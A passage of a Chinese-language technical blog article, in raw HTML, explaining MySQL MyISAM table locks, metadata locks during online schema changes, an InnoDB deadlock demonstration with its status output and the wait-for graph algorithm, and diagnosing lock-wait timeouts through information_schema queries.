height=\"342\"></p>\n<p>session2：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/4b007a1f2f3e117f9a752641a3606159.jpg\" alt=\"\" width=\"574\" height=\"254\"></p>\n<p>可以看到会话1启用表锁（读锁）执行读操作，这时会话2可以并行执行读操作，但写操作被阻塞。接着看：</p>\n<p>session1:</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/36145803941c5f88fa8631e1a3cf7904.jpg\" alt=\"\" width=\"455\" height=\"335\"></p>\n<p>session2:</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/15fc394ec90d39dcae247b882f5eea96.jpg\" alt=\"\" width=\"441\" height=\"65\"></p>\n<p>当session1执行解锁后，seesion2则立刻开始执行写操作，即读-写串行。</p>\n<p>总结：</p>\n<p>到此我们把问题的原因基本分析清楚，总结一下——MyISAM存储引擎执行操作时会产生表锁，将影响其他用户对该表的操作，如果表锁是写锁，则会导致其他用户操作串行，如果是读锁则其他用户的读操作可以并行。所以有时我们遇到某个简单的查询花了很长时间，看看是不是这种情况。</p>\n<p>解决办法：</p>\n<p>1）、尽量不用MyISAM存储引擎，在MySQL8.0版本中已经去掉了所有的MyISAM存储引擎的表，推荐使用InnoDB存储引擎。</p>\n<p>2）、如果一定要用MyISAM存储引擎，减少写操作的时间；</p>\n<p>3、线上修改表结构有哪些风险？</p>\n<p>如果有一天业务系统需要增大一个字段长度，能否在线上直接修改呢？在回答这个问题前，我们先来看一个案例：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/83407a7505b251e321242c1a206468e8.jpg\" alt=\"\" width=\"595\" height=\"39\"></p>\n<p>以上语句尝试修改user表的name字段长度，语句被阻塞。按照惯例，我们检查一下当前进程：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/2e87c7f9d99ba728ef0e052c8a9317b0.jpg\" alt=\"\" width=\"534\" height=\"204\"></p>\n<p>从进程可以看出alter语句在等待一个元数据锁，而这个元数据锁很可能是上面这条select语句引起的，事实正是如此。在执行DML（select、update、delete、insert）操作时，会对表增加一个元数据锁，这个元数据锁是为了保证在查询期间表结构不会被修改，因此上面的alter语句会被阻塞。那么如果执行顺序相反，先执行alter语句，再执行DML语句呢？DML语句会被阻塞吗？例如我正在线上环境修改表结构，线上的DML语句会被阻塞吗？答案是：不确定。</p>\n<p>在MySQL5.6开始提供了online ddl功能，允许一些DDL语句和DML语句并发，在当前5.7版本对online ddl又有了增强，这使得大部分DDL操作可以在线进行。详见：<a href=\"https://dev.mysql.com/doc/refman/5.7/en/innodb-create-index-overview.html\" rel=\"nofollow\">https://dev.mysql.com/doc/refman/5.7/en/innodb-create-index-overview.html</a></p>\n<p>所以对于特定场景执行DDL过程中，DML是否会被阻塞需要视场景而定。</p>\n<p>总结：通过这个例子我们对元数据锁和online ddl有了一个基本的认识，如果我们在业务开发过程中有在线修改表结构的需求，可以参考以下方案：</p>\n<p>1、尽量在业务量小的时间段进行；</p>\n<p>2、查看官方文档，确认要做的表修改可以和DML并发，不会阻塞线上业务；</p>\n<p>3、推荐使用percona公司的pt-online-schema-change工具，该工具被官方的online ddl更为强大，它的基本原理是：通过insert… select…语句进行一次全量拷贝，通过触发器记录表结构变更过程中产生的增量，从而达到表结构变更的目的。</p>\n<p>例如要对A表进行变更，主要步骤为：</p>\n<p><em>创建目的表结构的空表，A_new;</em><br>\n<em>在A表上创建触发器，包括增、删、改触发器;</em><br>\n<em>通过insert…select…limit N 语句分片拷贝数据到目的表</em><br>\n<em>Copy完成后，将A_new表rename到A表。</em></p>\n<p>4、一个死锁问题的分析</p>\n<p>在线上环境下死锁的问题偶有发生，死锁是因为两个或多个事务相互等待对方释放锁，导致事务永远无法终止的情况。为了分析问题，我们下面将模拟一个简单死锁的情况，然后从中总结出一些分析思路。</p>\n<p>演示环境：MySQL5.7.20 事务隔离级别：RR</p>\n<p>表user：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93061d55134470012\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE `USER` (\r\n`ID` INT(11) NOT NULL AUTO_INCREMENT,\r\n`NAME` VARCHAR(300) DEFAULT NULL,\r\n`AGE` INT(11) DEFAULT NULL,\r\nPRIMARY KEY (`ID`)\r\n) ENGINE=INNODB AUTO_INCREMENT=5 DEFAULT CHARSET=UTF8</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d55134470012-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93061d55134470012-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d55134470012-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93061d55134470012-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d55134470012-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93061d55134470012-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93061d55134470012-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-i\">TABLE</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">USER</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93061d55134470012-2\"><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">ID</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">AUTO_INCREMENT</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93061d55134470012-3\"><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">NAME</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">VARCHAR</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">300</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93061d55134470012-4\"><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">AGE</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">INT</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">11</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93061d55134470012-5\"><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">ID</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93061d55134470012-6\"><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ENGINE</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">INNODB </span><span class=\"crayon-v\">AUTO_INCREMENT</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CHARSET</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">UTF8</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p></p>\n<div></div>\n<p>下面演示事务1、事务2工作的情况：</p>\n<div>\n<table>\n<colgroup>\n<col>\n<col>\n<col>\n<col></colgroup>\n<thead>\n<tr>\n<th scope=\"col\"></th>\n<th scope=\"col\">\n<div>事务1</div>\n</th>\n<th scope=\"col\">\n<div>事务2</div>\n</th>\n<th colspan=\"1\" scope=\"col\">\n<div>事务监控</div>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>T1</td>\n<td>begin;\n<p>Query OK, 0 rows affected (0.00 sec)</p></td>\n<td>begin;\n<p>Query OK, 0 rows affected (0.00 sec)</p></td>\n<td colspan=\"1\"></td>\n</tr>\n<tr>\n<td>T2</td>\n<td>select * from user where id=3 for update;\n<p>+—-+——+——+<br>\n| id | name | age |<br>\n+—-+——+——+<br>\n| 3 | sun | 20 |<br>\n+—-+——+——+<br>\n1 row in set (0.00 sec)</p></td>\n<td>select * from user where id=4 for update;\n<p>+—-+——+——+<br>\n| id | name | age |<br>\n+—-+——+——+<br>\n| 4 | zhou | 21 |<br>\n+—-+——+——+<br>\n1 row in set (0.00 sec)</p></td>\n<td colspan=\"1\">select * from information_schema.INNODB_TRX；\n<p>通过查询元数据库innodb事务表，监控到当前运行事务数为2，即事务1、事务2。</p></td>\n</tr>\n<tr>\n<td>T3</td>\n<td>update user set name=’haha’ where id=4;\n<p>因为id=4的记录已被事务2加上行锁，该语句将阻塞</p></td>\n<td></td>\n<td colspan=\"1\">监控到当前运行事务数为2。</td>\n</tr>\n<tr>\n<td>T4</td>\n<td>阻塞状态</td>\n<td>update user set name=’hehe’ where id=3;\n<p>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</p>\n<p>id=3的记录已被事务1加上行锁，而本事务持有id=4的记录行锁，此时InnoDB存储引擎检查出死锁，本事务被回滚。</p></td>\n<td colspan=\"1\">事务2被回滚，事务1仍在运行中，监控当前运行事务数为1。</td>\n</tr>\n<tr>\n<td colspan=\"1\">T5</td>\n<td colspan=\"1\">Query OK, 1 row affected (20.91 sec)<br>\nRows matched: 1 Changed: 1 Warnings: 0由于事务2被回滚，原来阻塞的update语句被继续执行。</td>\n<td colspan=\"1\"></td>\n<td colspan=\"1\">监控当前运行事务数为1。</td>\n</tr>\n<tr>\n<td colspan=\"1\">T6</td>\n<td colspan=\"1\">commit；\n<p>Query OK, 0 rows affected (0.00 sec)</p></td>\n<td colspan=\"1\"></td>\n<td colspan=\"1\">事务1已提交、事务2已回滚，监控当前运行事务数为0。</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>这是一个简单的死锁场景，事务1、事务2彼此等待对方释放锁，InnoDB存储引擎检测到死锁发生，让事务2回滚，这使得事务1不再等待事务B的锁，从而能够继续执行。那么InnoDB存储引擎是如何检测到死锁的呢？为了弄明白这个问题，我们先检查此时InnoDB的状态：</p>\n<p>show engine innodb statusG</p>\n<p>————————<br>\n<strong>LATEST DETECTED DEADLOCK</strong><br>\n————————<br>\n2018-01-14 12:17:13 0x70000f1cc000<br>\n*** (1) TRANSACTION:<br>\nTRANSACTION 5120, ACTIVE 17 sec starting index read<br>\nmysql tables in use 1, locked 1<br>\nLOCK WAIT 3 lock struct(s), heap size 1136, 2 row lock(s)<br>\nMySQL thread id 10, OS thread handle 123145556967424, query id 2764 localhost root updating<br>\nupdate user set name=’haha’ where id=4<br>\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:<br>\nRECORD LOCKS space id 94 page no 3 n bits 80 index PRIMARY of table <code>test</code>.<code>user</code> trx id 5120 lock_mode X locks rec but not gap waiting<br>\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 5; compact format; info bits 0<br>\n0: len 4; hex 80000004; asc ;;<br>\n1: len 6; hex 0000000013fa; asc ;;<br>\n2: len 7; hex 520000060129a6; asc R ) ;;<br>\n3: len 4; hex 68616861; asc haha;;<br>\n4: len 4; hex 80000015; asc ;;</p>\n<p>*** (2) TRANSACTION:<br>\nTRANSACTION 5121, ACTIVE 12 sec starting index read<br>\nmysql tables in use 1, locked 1<br>\n3 lock struct(s), heap size 1136, 2 row lock(s)<br>\nMySQL thread id 11, OS thread handle 123145555853312, query id 2765 localhost root updating<br>\nupdate user set name=’hehe’ where id=3<br>\n*** (2) HOLDS THE LOCK(S):<br>\nRECORD LOCKS space id 94 page no 3 n bits 80 index PRIMARY of table <code>test</code>.<code>user</code> trx id 5121 lock_mode X locks rec but not gap<br>\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 5; compact format; info bits 0<br>\n0: len 4; hex 80000004; asc ;;<br>\n1: len 6; hex 0000000013fa; asc ;;<br>\n2: len 7; hex 520000060129a6; asc R ) ;;<br>\n3: len 4; hex 68616861; asc haha;;<br>\n4: len 4; hex 80000015; asc ;;</p>\n<p>*** (2) WAITING FOR THIS LOCK TO BE GRANTED:<br>\nRECORD LOCKS space id 94 page no 3 n bits 80 index PRIMARY of table <code>test</code>.<code>user</code> trx id 5121 lock_mode X locks rec but not gap waiting<br>\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 5; compact format; info bits 0<br>\n0: len 4; hex 80000003; asc ;;<br>\n1: len 6; hex 0000000013fe; asc ;;<br>\n2: len 7; hex 5500000156012f; asc U V /;;<br>\n3: len 4; hex 68656865; asc hehe;;<br>\n4: len 4; hex 80000014; asc ;;</p>\n<p><strong>*** WE ROLL BACK TRANSACTION (2)</strong></p>\n<p>InnoDB状态有很多指标，这里我们截取死锁相关的信息，可以看出InnoDB可以输出最近出现的死锁信息，其实很多死锁监控工具也是基于此功能开发的。</p>\n<p>在死锁信息中，显示了两个事务等待锁的相关信息（蓝色代表事务1、绿色代表事务2），重点关注：WAITING FOR THIS LOCK TO BE GRANTED和HOLDS THE LOCK(S)。</p>\n<p>WAITING FOR THIS LOCK TO BE GRANTED表示当前事务正在等待的锁信息，从输出结果看出事务1正在等待heap no为5的行锁，事务2正在等待 heap no为7的行锁；</p>\n<p>HOLDS THE LOCK(S)：表示当前事务持有的锁信息，从输出结果看出事务2持有heap no为5行锁。</p>\n<p>从输出结果看出，最后InnoDB回滚了事务2。</p>\n<p>那么InnoDB是如何检查出死锁的呢？</p>\n<p>我们想到最简单方法是假如一个事务正在等待一个锁，如果等待时间超过了设定的阈值，那么该事务操作失败，这就避免了多个事务彼此长等待的情况。参数innodb_lock_wait_timeout正是用来设置这个锁等待时间的。</p>\n<p>如果按照这个方法，解决死锁是需要时间的（即等待超过innodb_lock_wait_timeout设定的阈值），这种方法稍显被动而且影响系统性能，InnoDB存储引擎提供一个更好的算法来解决死锁问题，wait-for graph算法。简单的说，当出现多个事务开始彼此等待时，启用wait-for graph算法，该算法判定为死锁后立即回滚其中一个事务，死锁被解除。该方法的好处是：检查更为主动，等待时间短。</p>\n<p>下面是wait-for graph算法的基本原理：</p>\n<p>为了便于理解，我们把死锁看做4辆车彼此阻塞的场景：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/f7a883112a5f506ea98df7e92ef9c2c2.png\" alt=\"\"></p>\n<div>\n<div id=\"drawio-macro-content-1304169245--1911697403456626598\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/2eb724512ffd6c6d5f27e6aabbfe5a02.jpg\" alt=\"\" width=\"316\" height=\"300\"></div>\n</div>\n<p>4辆车看做4个事务，彼此等待对方的锁，造成死锁。wait-for graph算法原理是把事务作为节点，事务之间的锁等待关系，用有向边表示，例如事务A等待事务B的锁，就从节点A画一条有向边到节点B，这样如果A、B、C、D构成的有向图，形成了环，则判断为死锁。这就是wait-for graph算法的基本原理。</p>\n<p>总结：</p>\n<p>1、如果我们业务开发中出现死锁如何检查出？刚才已经介绍了通过监控InnoDB状态可以得出，你可以做一个小工具把死锁的记录收集起来，便于事后查看。</p>\n<p>2、如果出现死锁，业务系统应该如何应对？从上文我们可以看到当InnoDB检查出死锁后，对客户端报出一个Deadlock found when trying to get lock; try restarting transaction信息，并且回滚该事务，应用端需要针对该信息，做事务重启的工作，并保存现场日志事后做进一步分析，避免下次死锁的产生。</p>\n<p>5、锁等待问题的分析</p>\n<p>在业务开发中死锁的出现概率较小，但锁等待出现的概率较大，锁等待是因为一个事务长时间占用锁资源，而其他事务一直等待前个事务释放锁。</p>\n<div>\n<table>\n<colgroup>\n<col>\n<col>\n<col>\n<col></colgroup>\n<thead>\n<tr>\n<th scope=\"col\"></th>\n<th scope=\"col\">\n<div>事务1</div>\n</th>\n<th scope=\"col\">\n<div>事务2</div>\n</th>\n<th scope=\"col\">\n<div>事务监控</div>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>T1</td>\n<td>begin;\n<p>Query OK, 0 rows affected (0.00 sec)</p></td>\n<td>begin;\n<p>Query OK, 0 rows affected (0.00 sec)</p></td>\n<td></td>\n</tr>\n<tr>\n<td>T2</td>\n<td>select * from user where id=3 for update;\n<p>+—-+——+——+<br>\n| id | name | age |<br>\n+—-+——+——+<br>\n| 3 | sun | 20 |<br>\n+—-+——+——+<br>\n1 row in set (0.00 sec)</p></td>\n<td>其他查询操作</td>\n<td>select * from information_schema.INNODB_TRX；\n<p>通过查询元数据库innodb事务表，监控到当前运行事务数为2，即事务1、事务2。</p></td>\n</tr>\n<tr>\n<td>T3</td>\n<td> 其他查询操作</td>\n<td> update user set name=’hehe’ where id=3;\n<p>因为id=3的记录被事务1加上行锁，所以该语句将阻塞（即锁等待）</p></td>\n<td> 监控到当前运行事务数为2。</td>\n</tr>\n<tr>\n<td colspan=\"1\">T4</td>\n<td colspan=\"1\">其他查询操作</td>\n<td colspan=\"1\">ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction\n<p>锁等待时间超过阈值，操作失败。注意：此时事务2并没有回滚。</p></td>\n<td colspan=\"1\">监控到当前运行事务数为2。</td>\n</tr>\n<tr>\n<td colspan=\"1\">T5</td>\n<td colspan=\"1\">commit;</td>\n<td colspan=\"1\"></td>\n<td colspan=\"1\">事务1已提交，事务2未提交，监控到当前运行事务数为1。</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>从上述可知事务1长时间持有id=3的行锁，事务2产生锁等待，等待时间超过innodb_lock_wait_timeout后操作中断，但事务并没有回滚。如果我们业务开发中遇到锁等待，不仅会影响性能，还会给你的业务流程提出挑战，因为你的业务端需要对锁等待的情况做适应的逻辑处理，是重试操作还是回滚事务。</p>\n<p>在MySQL元数据表中有对事务、锁等待的信息进行收集，例如information_schema数据库下的INNODB_LOCKS、INNODB_TRX、INNODB_LOCK_WAITS，你可以通过这些表观察你的业务系统锁等待的情况。你也可以用一下语句方便的查询事务和锁等待的关联关系：</p>\n<div></div>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93061d64453711093\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT     R.TRX_ID WAITING_TRX_ID,\r\n           R.TRX_MYSQL_THREAD_ID WAITING_THREAD,\r\n           R.TRX_QUERY WATING_QUERY,\r\n           B.TRX_ID BLOCKING_TRX_ID,\r\n           B.TRX_MYSQL_THREAD_ID BLOCKING_THREAD,\r\n           B.TRX_QUERY BLOCKING_QUERY\r\nFROM     INFORMATION_SCHEMA.INNODB_LOCK_WAITS W\r\nINNER JOIN     INFORMATION_SCHEMA.INNODB_TRX B ON B.TRX_ID = W.BLOCKING_TRX_ID\r\nINNER JOIN     INFORMATION_SCHEMA.INNODB_TRX R ON R.TRX_ID = W.REQUESTING_TRX_ID;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d64453711093-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93061d64453711093-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d64453711093-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93061d64453711093-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d64453711093-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93061d64453711093-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d64453711093-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93061d64453711093-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa93061d64453711093-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93061d64453711093-1\"><span class=\"crayon-i\">SELECT</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">R</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">TRX_ID </span><span class=\"crayon-v\">WAITING_TRX_ID</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93061d64453711093-2\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">R</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">TRX_MYSQL_THREAD_ID </span><span class=\"crayon-v\">WAITING_THREAD</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93061d64453711093-3\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">R</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">TRX_QUERY </span><span class=\"crayon-v\">WATING_QUERY</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93061d64453711093-4\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">TRX_ID </span><span class=\"crayon-v\">BLOCKING_TRX_ID</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93061d64453711093-5\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">TRX_MYSQL_THREAD_ID </span><span class=\"crayon-v\">BLOCKING_THREAD</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93061d64453711093-6\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">TRX_QUERY </span><span class=\"crayon-e\">BLOCKING_QUERY</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93061d64453711093-7\"><span class=\"crayon-i\">FROM</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">INFORMATION_SCHEMA</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">INNODB_LOCK</span><span class=\"crayon-sy\">_</span>WAITS<span class=\"crayon-h\"> </span><span class=\"crayon-i\">W</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93061d64453711093-8\"><span class=\"crayon-e\">INNER </span><span class=\"crayon-i\">JOIN</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">INFORMATION_SCHEMA</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">INNODB</span><span class=\"crayon-sy\">_</span>TRX<span class=\"crayon-h\"> </span><span class=\"crayon-i\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ON</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TRX_ID</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">W</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">BLOCKING_TRX_ID</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa93061d64453711093-9\"><span class=\"crayon-e\">INNER </span><span class=\"crayon-i\">JOIN</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-v\">INFORMATION_SCHEMA</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">INNODB</span><span class=\"crayon-sy\">_</span>TRX<span class=\"crayon-h\"> </span><span class=\"crayon-i\">R</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ON</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">R</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TRX_ID</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">W</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">REQUESTING_TRX_ID</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>结果：</p>\n<p>waiting_trx_id: 5132<br>\nwaiting_thread: 11<br>\nwating_query: update user set name=’hehe’ where id=3<br>\nblocking_trx_id: 5133<br>\nblocking_thread: 10<br>\nblocking_query: 